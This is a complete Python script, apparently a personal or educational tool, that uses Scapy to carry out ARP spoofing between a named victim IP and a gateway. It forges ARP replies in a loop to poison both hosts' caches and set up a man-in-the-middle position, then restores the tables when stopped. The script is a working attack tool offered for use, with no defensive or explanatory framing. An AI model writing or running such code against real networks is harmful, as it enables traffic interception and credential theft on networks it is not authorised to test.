from scapy.all import *
import time
import sys
import argparse

def get_mac(ip):

    # Scapy function to send an ARP request and get the MAC address
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request

    ans, _ = srp(arp_request_broadcast, timeout=1, verbose=False)

    if ans:
        return ans[0][1].hwsrc
    return None

def spoof(target_ip, spoof_ip, target_mac, verbose=True):
    
    if not target_mac:
        print(f"[-] Could not find MAC address for {target_ip}")
        return

    # ARP reply packer
    ether = Ether(dst=target_mac)  
    arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    packet = ether / arp
    
    # send the packet and hide output
    sendp(packet, verbose=False) 

    # if verbose:
    #     print(f"[+] Sent to {target_ip}: pretending to be {spoof_ip}")

def restore(victim_ip, victim_mac, gateway_ip, gateway_mac):
    # Restore victim's ARP table
    send(ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, hwsrc=gateway_mac), count=5, verbose=False)

    # Restore gateway's ARP table
    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip, hwsrc=victim_mac), count=5, verbose=False)

def start_arp_spoof(victim_ip, gateway_ip, victim_mac, gateway_mac, interval=2, verbose=True):
    if verbose:
        print(f"[+] Starting ARP Spoofing (Interval: {interval}s)... Press CTRL+C to stop")
    else:
        print(f"[+] Starting ARP Spoofing (Silent Mode)... Press CTRL+C to stop")

    while True:
        spoof(victim_ip, gateway_ip, victim_mac)
        spoof(gateway_ip, victim_ip, gateway_mac)
        time.sleep(interval)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ARP and DNS Spoofing Tool. Victim and Gateway IPs required.")
    parser.add_argument("--victim", required=True, help="IP address of the victim machine")
    parser.add_argument("--gateway", required=True, help="IP address of the gateway")
    args = parser.parse_args()

    try: 
        victim_mac = get_mac(args.victim)
        gateway_mac = get_mac(args.gateway)

                
        if not victim_mac or not gateway_mac:
            print("[-] Could not find MAC addresses. Exiting.")
            sys.exit(1)

        print(f"[+] Victim: {args.victim} ({victim_mac})")
        print(f"[+] Gateway: {args.gateway} ({gateway_mac})")
        print("[+] Starting ARP Spoofing... Press CTRL+C to stop")

        start_arp_spoof(args.victim, args.gateway, victim_mac, gateway_mac)
    except KeyboardInterrupt:
        print("\n[+] Stopping ARP Spoofing. Restoring network...")
        restore(args.victim, victim_mac, args.gateway, gateway_mac)